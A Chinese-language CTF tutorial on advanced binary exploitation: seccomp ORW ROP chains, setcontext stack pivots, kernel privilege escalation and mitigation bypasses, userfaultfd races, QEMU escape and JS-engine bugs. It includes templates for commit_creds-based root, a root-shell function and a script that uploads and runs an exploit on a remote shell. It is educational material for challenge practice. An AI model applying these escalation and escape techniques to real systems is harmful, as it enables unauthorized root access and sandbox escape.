# 高级 PWN 场景

## seccomp / ORW

有些 PWN 题为了增加难度，会使用 seccomp 禁用部分系统调用，尤其是禁用 `execve`。这类题通常拿不到 shell，但 PWN 的目标是 flag，因此可以改用 ORW：

```text
open("./flag", 0)
read(fd, buf, size)
write(1, buf, size)
```

识别特征：

- 程序调用 `prctl(PR_SET_SECCOMP, ...)`、`seccomp()`、`sandbox()`。
- `seccomp-tools dump ./pwn` 能看到 syscall 白名单。
- 执行 `system("/bin/sh")` 或 `execve("/bin/sh")` 无效。

基础 ROP：

```python
rop = flat(
    pop_rdi, flag_addr,
    pop_rsi, 0,
    pop_rdx, 0,
    pop_rax, 2,
    syscall_ret,          # open

    pop_rdi, 3,
    pop_rsi, buf,
    pop_rdx, 0x100,
    read_addr,

    pop_rdi, 1,
    pop_rsi, buf,
    pop_rdx, 0x100,
    write_addr,
)
```

如果题目是堆题，最终只能把一个 hook 改成一个 gadget，通用思路是用 `setcontext` 做栈迁移。`setcontext` 中存在对 `rsp` 的赋值，只要能控制相应寄存器和内存，就能切到我们布置好的 ORW ROP 链。

关键片段：

```asm
mov rsp, [rdx+0A0h]
mov rbx, [rdx+80h]
mov rbp, [rdx+78h]
...
push rcx
mov rsi, [rdx+70h]
mov rdi, [rdx+68h]
mov rdx, [rdx+88h]
```

利用流程：

1. 堆利用拿到任意写。
2. 改 `__free_hook` 或其他可触发函数指针为 magic gadget。
3. magic gadget 负责把 `rdx` 指向可控堆块。
4. 跳入 `setcontext+offset`，恢复寄存器并迁移 `rsp`。
5. 在新栈上执行 ORW 链。

## kernel pwn

kernel pwn 与用户态 pwn 本质上都是利用漏洞控制执行流或修改关键数据，但环境不同：

- 远程环境变成完整 Linux 环境。
- 攻击对象常是一个可装载内核模块。
- exploit 通常是静态编译的用户态程序。
- 打远程不是直接交互，而是把 exploit 传入远程系统再运行。

常见附件：

```text
bzImage
rootfs.cpio
run.sh
vmlinux
*.ko
init
```

基本分析流程：

1. 解包 rootfs，找到内核模块和启动脚本。
2. 看 `run.sh`，记录 KASLR、SMEP、SMAP、KPTI、FGKASLR、cred 相关限制。
3. 逆向 `.ko`，重点看 `open/read/write/ioctl/mmap` 回调。
4. 找漏洞：栈溢出、堆溢出、UAF、double fetch、race、越界读写、任意地址读写。
5. 泄露内核基址和堆地址。
6. 提权：`commit_creds(prepare_kernel_cred(0))` 或修改当前进程 cred。
7. 绕过 KPTI/SMEP/SMAP，安全返回用户态执行 root shell。

### exploit 传输

通用方式是 base64 分片传输：

```python
from pwn import *
import base64

with open("./exp", "rb") as f:
    exp = base64.b64encode(f.read())

p = remote("127.0.0.1", 11451)

for i in range(0, len(exp), 0x200):
    p.sendline("echo -n \"" + exp[i:i + 0x200].decode() + "\" >> /tmp/b64_exp")
    p.recvuntil("/ $")

p.sendline("cat /tmp/b64_exp | base64 -d > /tmp/exploit")
p.sendline("chmod +x /tmp/exploit")
p.sendline("/tmp/exploit")
p.interactive()
```

为了减小体积：

- 静态链接可用 musl。
- 时间充足时用纯汇编写 exp。
- 去掉不必要输出和调试符号。

### 常用模板

保存用户态上下文，供 kernel ROP 返回用户态：

```c
size_t user_cs, user_ss, user_rflags, user_sp;

void save_status() {
    asm volatile(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
}
```

提权函数：

```c
void get_root_privilege(size_t prepare_kernel_cred, size_t commit_creds) {
    void *(*prepare_kernel_cred_ptr)(void *) =
        (void *(*)(void *)) prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) =
        (int (*)(void *)) commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}
```

检查 root 并弹 shell：

```c
void get_root_shell(void) {
    if (getuid()) {
        puts("failed");
        exit(1);
    }
    system("/bin/sh");
}
```

### 保护绕过

- KASLR：泄露内核地址，或侧信道/固定符号推算。
- SMEP：禁止内核执行用户态代码，改用 kernel ROP 或修改 CR4。
- SMAP：禁止内核访问用户态数据，避免直接让内核读用户态 ROP 数据。
- KPTI：返回用户态时需要走 trampoline 或构造完整返回序列。
- FGKASLR：函数级随机化，优先找未随机化区域、数据段或特殊 gadget。

常见 ret2usr 在现代环境常被 SMEP 阻止。更稳的路线是 kernel ROP：

```text
commit_creds(prepare_kernel_cred(0))
swapgs
iretq -> user_cs, user_rflags, user_sp, user_ss
```

## race / userfaultfd / double fetch

内核题中 race 很常见。特征是内核在检查和使用用户数据之间存在时间窗口，或者两次从用户态取同一份数据但没有固定副本。

double fetch 典型形态：

```c
copy_from_user(&size, user_size_ptr, sizeof(size));
if (size < LIMIT) {
    copy_from_user(kernel_buf, user_buf, size);
}
```

如果用户线程能在两次 fetch 之间修改 `size` 或指针，就可能绕过检查。

userfaultfd 常用来卡住内核访问用户页：

1. mmap 一页用户内存。
2. 注册 userfaultfd。
3. 让内核访问该页，触发 page fault 并挂起内核线程。
4. 在 handler 线程里修改对象、释放对象或喷射堆。
5. 解除 fault，让内核继续使用已经变化的数据。

用途：

- 扩大 race 窗口。
- 稳定 UAF。
- 在 copy_from_user 中间改变堆布局。

注意：部分新内核限制非特权 userfaultfd，需要看 `run.sh` 和 `/proc/sys/vm/unprivileged_userfaultfd`。

## QEMU / 虚拟化逃逸

QEMU 逃逸题通常给一个虚拟设备。目标是在 guest 中利用设备模拟代码漏洞，在 host QEMU 进程中读写内存，最终读取 flag 或拿 host shell。

识别特征：

- 附件包含 QEMU 源码 patch。
- `run.sh` 中有 `-device xxx`。
- 题目要求在 guest 里编译运行 exp。
- 设备有 MMIO/PMIO BAR。

基本流程：

1. 阅读 patch，定位新增设备结构体和回调函数。
2. 找 MMIO/PMIO read/write 入口。
3. 找漏洞：越界读写、DMA 越界、整数溢出、UAF、未初始化。
4. 在 guest 中通过 `/sys/bus/pci/devices` 找 BAR 地址。
5. mmap 设备 MMIO，或用 `in/out` 访问 PMIO。
6. 利用 OOB 泄露 QEMU/heap/libc 地址。
7. 改写 QEMU 进程中的函数指针、GOT、hook 或构造 ROP。
8. 读 host flag 或执行命令。

常用 guest 侧片段：

```c
int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
void *mmio = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
```

如果题目开放 QEMU monitor，还可以考虑利用 monitor 读取 flag。检查 `run.sh` 是否暴露 monitor、chardev、serial 或 socket。

## 浏览器 / JS 引擎

当前知识库也包含 Chrome/V8、Firefox、Safari 的入门资料。浏览器 PWN 题一般不是传统菜单题，而是 JIT/type confusion/OOB 写利用。

快速判断：

- 题目给浏览器版本或 V8 d8。
- JS 触发崩溃。
- patch 涉及 TurboFan、Ignition、Map、ElementsKind、ArrayBuffer。

通用路线：

1. 复现 crash，确定是类型混淆、OOB 读写还是 UAF。
2. 构造 addrof/fakeobj 原语。
3. 构造任意读写。
4. RWX wasm shellcode 或修改函数指针。
5. 沙箱题还需要 renderer escape。

这一类题需要结合具体引擎版本补充 Map、ElementsKind、JIT 管线、对象布局和补丁差异等背景。

## 总结

高级 PWN 的共同点是：不能只靠“覆盖返回地址 -> system”。要先判断限制来自哪里：

- syscall 被限制：ORW。
- 用户态被隔离：kernel 提权。
- 执行对象在模拟器：逃逸到 host。
- 控制流被现代保护挡住：栈迁移、SROP、setcontext、内核 ROP。

处理顺序仍然是：找 bug、拿 leak、建立读写原语、选最终控制目标、稳定远程。
